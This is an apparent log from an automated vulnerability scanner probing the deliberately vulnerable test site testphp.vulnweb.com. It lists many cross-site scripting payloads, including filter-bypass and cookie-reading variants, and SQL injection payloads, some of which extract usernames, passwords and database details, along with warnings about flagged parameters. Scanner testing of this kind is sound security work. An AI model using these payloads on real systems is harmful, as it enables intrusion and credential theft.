+2025-02-01 18:30:44,772 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='>'><SCript>alert(2);</script>
+2025-02-01 18:30:44,988 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<!<script>alert(4)</script>
+2025-02-01 18:30:45,203 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script /**/>/**/alert(/AmoloHT/)/**/</script /**/
+2025-02-01 18:30:45,418 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(/Chrome%20XSS%20filter%20bypass/);</script>
+2025-02-01 18:30:45,632 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==%script%alert(CXSS¢)4/script%
+2025-02-01 18:30:45,851 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+2025-02-01 18:30:46,067 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><<script>alert(document.cookie);//<</script>
+2025-02-01 18:30:46,283 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(document.cookie)</script>
+2025-02-01 18:30:46,497 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(document[‘cookie’])</script>
+2025-02-01 18:30:46,711 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+2025-02-01 18:30:46,929 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--
+2025-02-01 18:30:47,145 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==#<script>alert(document.domain)</script>
+2025-02-01 18:30:47,361 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<!<script>alert(document.domain)</script>
+2025-02-01 18:30:47,577 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(document.domain)</script>
+2025-02-01 18:30:47,793 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<=script>=alert("hacked")<=/scirpt>=
+2025-02-01 18:30:48,008 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(“hello”)</script>jnyf0
+2025-02-01 18:30:48,222 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<ScRipt>ALeRt("hi");</sCRipT>
+2025-02-01 18:30:48,437 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script ,>alert()</script>
+2025-02-01 18:30:48,651 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==>'>"><script>alert();</script>
+2025-02-01 18:30:48,867 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<Script>alert()</Script>
+2025-02-01 18:30:49,083 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert()</script>”/></style>
+2025-02-01 18:30:49,298 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script ^__^>alert(String.fromCharCode(49))</script ^__^
+2025-02-01 18:30:49,514 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+2025-02-01 18:30:49,729 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(String.fromCharCode(88,83,83))</script>
+2025-02-01 18:30:49,942 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<<SCRIPT>alert("test");//<</SCRIPT>
+2025-02-01 18:30:50,155 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert\u00281\u0029</script>
+2025-02-01 18:30:50,370 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert('\u0031')</script>
+2025-02-01 18:30:50,583 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+2025-02-01 18:30:50,796 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+2025-02-01 18:30:51,010 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(['X','S','S'].join(''))</script>
+2025-02-01 18:30:51,224 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(“xss”)</script>
+2025-02-01 18:30:51,439 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert('XSS')</script>
+2025-02-01 18:30:51,653 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert('XSS')</script>
+2025-02-01 18:30:51,866 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==//*><ScRipt>alert(/XSS/)</ScriPT>
+2025-02-01 18:30:52,079 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?artist==<script>alert(1234)</script>
+2025-02-01 18:30:52,294 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/listproducts.php?artist==<script>alert(1234)</script>
+2025-02-01 18:30:52,304 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?cat==<script>alert(1234)</script>
+2025-02-01 18:30:52,520 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/listproducts.php?cat==<script>alert(1234)</script>
+2025-02-01 18:30:52,539 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==<script>alert(1234)</script>
+2025-02-01 18:30:52,757 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/showimage.php?file==<script>alert(1234)</script>
+2025-02-01 18:30:52,771 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==<script>alert(1234)</script>
+2025-02-01 18:30:52,987 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/hpp/params.php?p==<script>alert(1234)</script>
+2025-02-01 18:30:53,002 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1234)</script>
+2025-02-01 18:30:53,218 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<ScripT>alert(1234)</ScRipT>
+2025-02-01 18:30:53,432 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(123)</script>
+2025-02-01 18:30:53,647 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='><script>alert(123)</script>
+2025-02-01 18:30:53,862 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==--><script>alert(123)</script>
+2025-02-01 18:30:54,079 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==><script>alert(123)</script>
+2025-02-01 18:30:54,294 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==＜script＞alert(123)＜/script＞
+2025-02-01 18:30:54,510 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(123);</script x="
+2025-02-01 18:30:54,724 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='><script>alert(123);</script x='
+2025-02-01 18:30:54,940 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==><script>alert(123);</script x=
+2025-02-01 18:30:55,156 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>’alert(1)’.replace(/.+/,eval)</script>
+2025-02-01 18:30:55,372 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(1)</script><"
+2025-02-01 18:30:55,586 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==#<script>alert(1)</script>
+2025-02-01 18:30:55,802 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='`"//><script>alert(1)</script>
+2025-02-01 18:30:56,017 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<!<script>alert(1)</script>
+2025-02-01 18:30:56,232 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<!<script>alert(1)</script> “
+2025-02-01 18:30:56,447 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<%<!--'%><script>alert(1);</script -->
+2025-02-01 18:30:56,662 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<%<script>alert(1)</script>
+2025-02-01 18:30:56,878 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<scr'+'ipt>alert(1)</scr'+'ipt>
+2025-02-01 18:30:57,094 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script /**/>/**/alert(1)/**/</script /**/
+2025-02-01 18:30:57,310 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>/&/-alert(1)</script>
+2025-02-01 18:30:57,796 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1)</script>
+2025-02-01 18:30:58,021 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert`1`</script>
+2025-02-01 18:30:58,243 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==\<script\>alert(1)\<\/script\>
+2025-02-01 18:30:58,464 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==“><script>alert(1);</script>
+2025-02-01 18:30:58,685 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<sCRipT>alert(1)</sCRiPt>
+2025-02-01 18:30:58,907 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<ScRiPt>alert(1)</sCriPt>
+2025-02-01 18:30:59,129 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==#<ScRiPt>alert(1)</ScRiPt>#
+2025-02-01 18:30:59,352 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<ScRiPt>alert(1)</ScRiPt>
+2025-02-01 18:30:59,584 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<<SCRIPT>alert(1);//<</SCRIPT>
+2025-02-01 18:30:59,805 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==*/</script>'>alert(1)/*<script/1='
+2025-02-01 18:31:00,026 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1)</script>.asp
+2025-02-01 18:31:00,247 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1)</script>.aspx
+2025-02-01 18:31:00,469 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1)</script>.htm
+2025-02-01 18:31:00,691 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1)</script>.html
+2025-02-01 18:31:00,913 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(1)</script>.php
+2025-02-01 18:31:01,136 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='"><script>alert(2);</script>
+2025-02-01 18:31:01,360 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='>  <script>alert(2);</script>
+2025-02-01 18:31:01,594 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='>'+'><script>alert(2);</script>
+2025-02-01 18:31:01,817 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==>"'><script>alert(2);</script>
+2025-02-01 18:31:02,039 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==>'"><script>alert(2);</script>
+2025-02-01 18:31:02,262 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==>'><script>alert(2);</script>
+2025-02-01 18:31:02,487 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='>'><SCript>alert(2);</script>
+2025-02-01 18:31:02,710 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<!<script>alert(4)</script>
+2025-02-01 18:31:02,933 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script /**/>/**/alert(/AmoloHT/)/**/</script /**/
+2025-02-01 18:31:03,156 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(/Chrome%20XSS%20filter%20bypass/);</script>
+2025-02-01 18:31:03,378 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==%script%alert(CXSS¢)4/script%
+2025-02-01 18:31:03,604 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+2025-02-01 18:31:03,830 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><<script>alert(document.cookie);//<</script>
+2025-02-01 18:31:04,053 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(document.cookie)</script>
+2025-02-01 18:31:04,275 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(document[‘cookie’])</script>
+2025-02-01 18:31:04,499 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+2025-02-01 18:31:04,723 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=='><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--
+2025-02-01 18:31:04,945 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==#<script>alert(document.domain)</script>
+2025-02-01 18:31:05,168 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<!<script>alert(document.domain)</script>
+2025-02-01 18:31:05,399 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(document.domain)</script>
+2025-02-01 18:31:05,623 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<=script>=alert("hacked")<=/scirpt>=
+2025-02-01 18:31:05,846 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(“hello”)</script>jnyf0
+2025-02-01 18:31:06,070 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<ScRipt>ALeRt("hi");</sCRipT>
+2025-02-01 18:31:06,293 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script ,>alert()</script>
+2025-02-01 18:31:06,516 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==>'>"><script>alert();</script>
+2025-02-01 18:31:06,740 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<Script>alert()</Script>
+2025-02-01 18:31:06,961 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert()</script>”/></style>
+2025-02-01 18:31:07,183 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script ^__^>alert(String.fromCharCode(49))</script ^__^
+2025-02-01 18:31:07,409 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+2025-02-01 18:31:07,631 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert(String.fromCharCode(88,83,83))</script>
+2025-02-01 18:31:07,853 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<<SCRIPT>alert("test");//<</SCRIPT>
+2025-02-01 18:31:08,077 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert\u00281\u0029</script>
+2025-02-01 18:31:08,300 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert('\u0031')</script>
+2025-02-01 18:31:08,523 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+2025-02-01 18:31:08,747 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+2025-02-01 18:31:08,969 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(['X','S','S'].join(''))</script>
+2025-02-01 18:31:09,195 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert(“xss”)</script>
+2025-02-01 18:31:09,419 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic=="><script>alert('XSS')</script>
+2025-02-01 18:31:09,642 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==<script>alert('XSS')</script>
+2025-02-01 18:31:09,865 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==//*><ScRipt>alert(/XSS/)</ScriPT>
+2025-02-01 18:31:10,088 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==<script>alert(1234)</script>
+2025-02-01 18:31:10,311 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/hpp/?pp==<script>alert(1234)</script>
+2025-02-01 18:31:10,324 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==<script>alert(1234)</script>
+2025-02-01 18:31:10,548 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/hpp/params.php?pp==<script>alert(1234)</script>
+2025-02-01 18:31:10,563 - INFO - Vulnerabilities found in template: Cross-Site Scripting (XSS)
+2025-02-01 18:31:10,564 - INFO - Scanning completed for Cross-Site Scripting (XSS)! Time elapsed: 104.87 seconds
+2025-02-01 18:31:10,564 - INFO - Vulnerability found in template app/vuln_templates/A03/xss.py
+2025-02-01 18:31:10,578 - INFO - Scanning SQL Injection (Total payloads: 23)
+2025-02-01 18:31:10,579 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==' OR '1'='1
+2025-02-01 18:31:11,063 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/artists.php?artist==' OR '1'='1
+2025-02-01 18:31:11,074 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?artist==' OR '1'='1
+2025-02-01 18:31:11,293 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/listproducts.php?artist==' OR '1'='1
+2025-02-01 18:31:11,309 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?cat==' OR '1'='1
+2025-02-01 18:31:11,531 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/listproducts.php?cat==' OR '1'='1
+2025-02-01 18:31:11,545 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==' OR '1'='1
+2025-02-01 18:31:11,770 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==" OR "1"="1
+2025-02-01 18:31:11,995 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==' OR 1=1--
+2025-02-01 18:31:12,221 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==" OR 1=1--
+2025-02-01 18:31:12,445 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==' OR 1=1#
+2025-02-01 18:31:12,671 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==" OR 1=1#
+2025-02-01 18:31:12,892 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==') OR ('1'='1
+2025-02-01 18:31:13,110 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==") OR ("1"="1
+2025-02-01 18:31:13,333 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==')) OR (('1'='1
+2025-02-01 18:31:13,561 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==")) OR (("1"="1
+2025-02-01 18:31:13,784 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' ORDER BY 1--+
+2025-02-01 18:31:14,008 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' UNION SELECT 1,2,3--+
+2025-02-01 18:31:14,232 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:14,458 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1 OR 1=CONVERT(int, @@version)
+2025-02-01 18:31:14,684 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(75),CHAR(76),CHAR(77))--
+2025-02-01 18:31:14,911 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND ERROR_MESSAGE()--
+2025-02-01 18:31:15,135 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:15,364 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, @@version--
+2025-02-01 18:31:15,587 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, CURRENT_USER--
+2025-02-01 18:31:15,815 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, USER()--
+2025-02-01 18:31:16,038 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, DATABASE()--
+2025-02-01 18:31:16,265 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, SCHEMA_NAME()--
+2025-02-01 18:31:16,486 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==1' AND 1=0 UNION ALL SELECT NULL, NULL, VERSION()--
+2025-02-01 18:31:16,710 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==' OR '1'='1
+2025-02-01 18:31:16,930 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==" OR "1"="1
+2025-02-01 18:31:17,151 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==' OR 1=1--
+2025-02-01 18:31:17,370 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==" OR 1=1--
+2025-02-01 18:31:17,588 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==' OR 1=1#
+2025-02-01 18:31:17,808 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==" OR 1=1#
+2025-02-01 18:31:18,027 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==') OR ('1'='1
+2025-02-01 18:31:18,245 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==") OR ("1"="1
+2025-02-01 18:31:18,463 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==')) OR (('1'='1
+2025-02-01 18:31:18,680 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==")) OR (("1"="1
+2025-02-01 18:31:18,899 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' ORDER BY 1--+
+2025-02-01 18:31:19,117 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' UNION SELECT 1,2,3--+
+2025-02-01 18:31:19,337 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:19,554 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1 OR 1=CONVERT(int, @@version)
+2025-02-01 18:31:19,771 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(75),CHAR(76),CHAR(77))--
+2025-02-01 18:31:19,989 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND ERROR_MESSAGE()--
+2025-02-01 18:31:20,209 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:20,428 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, @@version--
+2025-02-01 18:31:20,648 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, CURRENT_USER--
+2025-02-01 18:31:20,867 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, USER()--
+2025-02-01 18:31:21,085 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, DATABASE()--
+2025-02-01 18:31:21,305 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, SCHEMA_NAME()--
+2025-02-01 18:31:21,523 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==1' AND 1=0 UNION ALL SELECT NULL, NULL, VERSION()--
+2025-02-01 18:31:21,742 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==' OR '1'='1
+2025-02-01 18:31:21,964 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/product.php?pic==' OR '1'='1
+2025-02-01 18:31:21,978 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==' OR '1'='1
+2025-02-01 18:31:22,197 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==" OR "1"="1
+2025-02-01 18:31:22,416 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==' OR 1=1--
+2025-02-01 18:31:22,634 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==" OR 1=1--
+2025-02-01 18:31:22,854 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==' OR 1=1#
+2025-02-01 18:31:23,073 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==" OR 1=1#
+2025-02-01 18:31:23,291 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==') OR ('1'='1
+2025-02-01 18:31:23,510 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==") OR ("1"="1
+2025-02-01 18:31:23,731 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==')) OR (('1'='1
+2025-02-01 18:31:23,948 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==")) OR (("1"="1
+2025-02-01 18:31:24,165 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' ORDER BY 1--+
+2025-02-01 18:31:24,384 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' UNION SELECT 1,2,3--+
+2025-02-01 18:31:24,600 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:24,817 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1 OR 1=CONVERT(int, @@version)
+2025-02-01 18:31:25,034 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(75),CHAR(76),CHAR(77))--
+2025-02-01 18:31:25,252 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND ERROR_MESSAGE()--
+2025-02-01 18:31:25,471 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:25,693 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, @@version--
+2025-02-01 18:31:25,913 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, CURRENT_USER--
+2025-02-01 18:31:26,133 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, USER()--
+2025-02-01 18:31:26,354 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, DATABASE()--
+2025-02-01 18:31:26,574 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, SCHEMA_NAME()--
+2025-02-01 18:31:26,791 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, VERSION()--
+2025-02-01 18:31:27,012 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==' OR '1'='1
+2025-02-01 18:31:27,232 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==" OR "1"="1
+2025-02-01 18:31:27,450 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==' OR 1=1--
+2025-02-01 18:31:27,671 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==" OR 1=1--
+2025-02-01 18:31:27,890 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==' OR 1=1#
+2025-02-01 18:31:28,107 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==" OR 1=1#
+2025-02-01 18:31:28,324 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==') OR ('1'='1
+2025-02-01 18:31:28,542 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==") OR ("1"="1
